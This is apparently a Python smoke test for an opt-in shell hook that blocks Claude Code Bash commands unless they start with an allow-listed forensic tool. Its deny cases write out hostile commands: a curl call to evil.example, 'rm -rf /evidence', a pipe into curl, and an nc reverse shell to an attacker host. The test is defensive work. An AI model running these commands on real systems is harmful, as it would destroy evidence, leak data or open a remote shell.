#!/usr/bin/env python3
"""pretooluse-deny-hook-smoke - deterministic test for the OPTIONAL OS-level
PreToolUse deny-hook (scripts/pretooluse-deny-hook.sh).

The hook is a defense-in-depth layer BELOW VERDICT's in-process typed-MCP
boundary (it never replaces it; it defaults OFF). When an operator wires it as
a Claude Code Bash PreToolUse hook, it must HARD-EXIT nonzero unless the first
invoked binary of the Bash command is on scripts/forensic-allowlist.txt.

This smoke feeds the hook the PreToolUse stdin JSON shape and asserts:
  * an allow-listed forensic binary (vol, log2timeline.py, ...)      -> exit 0
  * an absolute path to an allow-listed binary (/usr/bin/vol ...)    -> exit 0
  * a non-allow-listed binary (/bin/curl, rm, bash -c ...)           -> nonzero
    exit AND a clear denial message on stderr naming the binary
  * a non-Bash tool (Read/Edit) is ignored                           -> exit 0
  * a malformed / empty command fails CLOSED                         -> nonzero

It is pure stdlib, ~30ms, and prints PASS/FAIL per case. Run directly:
    python3 scripts/pretooluse-deny-hook-smoke.py
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
HOOK = REPO_ROOT / "scripts" / "pretooluse-deny-hook.sh"


def run_hook(payload: dict) -> subprocess.CompletedProcess[str]:
    """Invoke the hook with PreToolUse JSON on stdin (mirrors Claude Code)."""
    return subprocess.run(
        ["bash", str(HOOK)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        timeout=30,
    )


def bash_event(command: str) -> dict:
    """PreToolUse stdin shape for a Bash tool call."""
    return {
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": command},
    }


# (label, payload, expect_blocked, must_mention_in_stderr_if_blocked)
CASES = [
    # --- allow-listed forensic binaries must pass through (exit 0) ---
    ("allow: vol", bash_event("vol -f mem.raw windows.pslist"), False, None),
    (
        "allow: log2timeline.py",
        bash_event("log2timeline.py --parsers x out.plaso img"),
        False,
        None,
    ),
    (
        "allow: AmcacheParser",
        bash_event("AmcacheParser -f Amcache.hve --csv ."),
        False,
        None,
    ),
    (
        "allow: hayabusa",
        bash_event("hayabusa csv-timeline -d logs -o out.csv"),
        False,
        None,
    ),
    (
        "allow: absolute path",
        bash_event("/usr/bin/vol -f mem.raw windows.info"),
        False,
        None,
    ),
    (
        "allow: sudo mount wrapper",
        bash_event("sudo -n mount -o ro img /mnt"),
        False,
        None,
    ),
    # --- non-allow-listed binaries must be BLOCKED (nonzero + named) ---
    ("deny: /bin/curl", bash_event("/bin/curl http://evil.example/x"), True, "curl"),
    ("deny: rm", bash_event("rm -rf /evidence"), True, "rm"),
    # bash itself is not allow-listed; a pipe-free invocation reaches the
    # binary check and is denied by name. (A piped `bash -c '... | sh'` is
    # caught earlier by the chaining guard — see deny: pipe chaining below.)
    ("deny: bash binary", bash_event("bash -c true"), True, "bash"),
    (
        "deny: pipe chaining",
        bash_event("vol -f m.raw | curl http://x"),
        True,
        "chaining",
    ),
    ("deny: nc reverse shell", bash_event("nc -e /bin/sh attacker 4444"), True, "nc"),
    # --- non-Bash tools are not this hook's concern -> never block ---
    (
        "ignore: Read tool",
        {
            "hook_event_name": "PreToolUse",
            "tool_name": "Read",
            "tool_input": {"file_path": "/evidence/x"},
        },
        False,
        None,
    ),
    # --- fail CLOSED on a malformed / empty command ---
    ("fail-closed: empty command", bash_event("   "), True, None),
    ("fail-closed: bad json", None, True, None),
]


def main() -> int:
    if not HOOK.exists():
        print(f"FAIL  hook missing: {HOOK}")
        return 1

    failures = 0
    for label, payload, expect_blocked, mention in CASES:
        if payload is None:
            proc = subprocess.run(
                ["bash", str(HOOK)],
                input="not-json{",
                capture_output=True,
                text=True,
                timeout=30,
            )
        else:
            proc = run_hook(payload)

        blocked = proc.returncode != 0
        ok = blocked == expect_blocked
        if ok and expect_blocked and mention is not None:
            ok = mention.lower() in proc.stderr.lower()

        status = "PASS" if ok else "FAIL"
        print(f"{status}  {label}  (exit={proc.returncode}, blocked={blocked})")
        if not ok:
            failures += 1
            if proc.stderr.strip():
                print(f"      stderr: {proc.stderr.strip().splitlines()[0]}")

    if failures:
        print(f"\n{failures} case(s) failed")
        return 1
    print(f"\nall {len(CASES)} deny-hook cases passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
